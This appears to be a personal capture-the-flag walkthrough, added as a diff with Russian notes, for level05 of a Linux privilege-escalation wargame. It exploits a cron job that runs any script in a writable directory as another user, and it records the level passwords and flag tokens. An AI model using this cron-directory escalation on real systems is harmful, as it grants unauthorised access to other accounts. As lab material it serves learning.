@@ -1,0 +1,29 @@
+su level05
+ne2searoevaevoem4ov4ar8ap
+
+find / -user flag05
+
+cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+ (ulimit -t 5; bash -x "$i")
+ rm -f "$i"
+done
+при переподкоючении по sh выводит You have new mail.
+гуглим
+cat /var/spool/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+гуглим
+крон каждые две минуты запускает скрипт от имени пользователя flag05 
+
+создаем скрипт в /opt/openarenaserver/, через две минуты он выполненится от flag05 и удалился
+
+echo "getflag>>/tmp/getflag">>/opt/openarenaserver/getflag
+
+ждем 
+cat /tmp/getflag
+viuaaale9huek52boumoomioc
+
+su level06
+viuaaale9huek52boumoomioc
